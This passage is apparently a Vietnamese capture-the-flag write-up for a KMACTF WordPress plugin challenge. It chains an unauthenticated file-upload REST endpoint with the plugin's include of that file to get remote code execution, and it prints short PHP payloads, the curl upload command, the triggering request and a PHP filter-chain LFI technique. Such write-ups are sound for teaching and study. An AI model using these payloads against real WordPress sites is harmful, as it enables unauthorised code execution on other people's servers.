+&lt;p&gt;Và đoạn code này nằm trong hàm &lt;code&gt;__construct&lt;/code&gt; của class &lt;code&gt;WPSight_Framework&lt;/code&gt;
+Lệnh &lt;code&gt;wpsight();&lt;/code&gt; ở cuối file được gọi mỗi lần &lt;code&gt;WordPress&lt;/code&gt; load plugin này.
+Trong function đó, nếu biến global &lt;code&gt;$wpsight&lt;/code&gt; chưa tồn tại, nó sẽ &lt;code&gt;new WPSight_Framework()&lt;/code&gt; và sẽ làm load &lt;code&gt;constructor&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;:::note
+Mà mỗi lần truy cập web thì &lt;code&gt;wp&lt;/code&gt; sẽ &lt;code&gt;load plugin&lt;/code&gt; cho chúng ta, vậy chúng ta có thể coi như server luôn trigger &lt;code&gt;include&lt;/code&gt; file txt.
+:::
+&lt;img src=&quot;https://hackmd.io/_uploads/Bkia9PD2ee.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Vậy thì upload sẽ ở &lt;code&gt;endpoint&lt;/code&gt; nào :
+&lt;img src=&quot;https://hackmd.io/_uploads/SJ33jiL3ee.png&quot; alt=&quot;image&quot; /&gt;
+Thì nó sẽ &lt;code&gt;add_action&lt;/code&gt; vào &lt;code&gt;rest_api_init&lt;/code&gt; nên là mình tìm thấy docs :
+https://developer.wordpress.org/rest-api/extending-the-rest-api/adding-custom-endpoints/&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Sy4lhoU2el.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Vậy là chúng ta có thể gọi upload bằng query :
+&lt;code&gt;?rest_route=/safe-upload/v1/upload&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJhtnoU2xe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Upload thành công.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/H1Ma2sIhxl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Vậy giờ tìm cách để rce, bypass filter và size 64byte.&lt;/p&gt;
+&lt;p&gt;Thì trong magic method của PHP có function magic method &lt;code&gt;__construct&lt;/code&gt; là hàm sẽ được chạy khi chúng ta khởi tạo 1 object.&lt;/p&gt;
+&lt;p&gt;Vậy thì chúng ta có thể lợi dung nó với cách gọi hàm &lt;code&gt;$a($b)&lt;/code&gt; để RCE. (Dùng payload này là do nó ngắn để ko bị dính quá 64 kí tự)
+Ví dụ :
+&lt;img src=&quot;https://hackmd.io/_uploads/ryHFCsI3gx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Và để control thì chúng ta có thể dùng &lt;code&gt;$_GET[1]($_GET[2])&lt;/code&gt; để truyền tham số vào bằng requests.&lt;/p&gt;
+&lt;p&gt;payload :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php class cc{function __construct(){$_GET[1]($_GET[2]);}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;upload :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl -X POST &quot;http://localhost:8082/?rest_route=/safe-upload/v1/upload&quot; -F &quot;file=@123.txt&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJAMynLngg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;GET /?wpsight-api=cc&amp;amp;1=system&amp;amp;2=ls HTTP/1.1
+Host: localhost:8082
+Connection: keep-alive
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyBdk2Lnex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Vì nó luôn &lt;code&gt;die(1)&lt;/code&gt; nên phải blind exploit.
+get Flag bằng cách copy file &lt;code&gt;flag.php&lt;/code&gt; ra &lt;code&gt;/var/www/html&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;cat /var/www/html/flag* |base64 &amp;gt; /var/www/html/duc193_xxxxxx.txt&lt;/code&gt;
+Được flag local :
+&lt;img src=&quot;https://hackmd.io/_uploads/ryb7eh83ex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Flag server :
+&lt;img src=&quot;https://hackmd.io/_uploads/B1MRx2U3xl.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;https://hackmd.io/_uploads/H1Zy-nLngl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Flag : &lt;code&gt;KMACTF{Y3s_it&apos;s__1dayupload_php_class_4nd_ex3cut3_it_⚆_⚆}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Còn 1 payload nữa đó chính là sử dụng hàm &lt;code&gt;include&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php class cd{function __construct(){include($_GET[1]);}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vì hàm LFI có rất nhiều cách khai thác khác nhau để RCE. Các bạn có thể tham khảo ở
+https://to016.github.io/posts/PHPLFI2RCE/
+Và còn nhiều cách khác các bạn có thể tìm hiểu thêm.
+Nhưng ở bài này mình làm theo cách PHP FilterChain cho nhanh.&lt;/p&gt;
+&lt;p&gt;Bài phân tích của a Endy cho các bạn dễ hiểu :
+https://hackmd.io/@endy/Skxms9eW2&lt;/p&gt;
+&lt;p&gt;Và cách gen payload thì có tool hỗ trợ :
+https://github.com/synacktiv/php_filter_chain_generator&lt;/p&gt;
+&lt;p&gt;Sau khi download về thì chạy&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 php_filter_chain_generator.py --chain &apos;&amp;lt;?php echo `cat fl* &amp;gt; duc_193.txt`; ?&amp;gt;&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Copy đoạn filterChain giống vậy:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|convert.base64-decode/resource=php://temp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/B1MpRPw2gg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Sau khi upload file lên thì requests tới :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJq2k_v3gl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Và chúng ta đã có flag.
+&lt;img src=&quot;https://hackmd.io/_uploads/BkapJ_Phge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;:::note
+Lưu ý : đây là mình làm local nên đã xoá đoạn &lt;code&gt;ob_start();&lt;/code&gt; và &lt;code&gt;ob_end_clean();&lt;/code&gt; để có thể nhận output cho dễ test. Do bây giờ server đang bị lỗi rồi.
+:::&lt;/p&gt;
+</content:encoded></item></channel></rss>
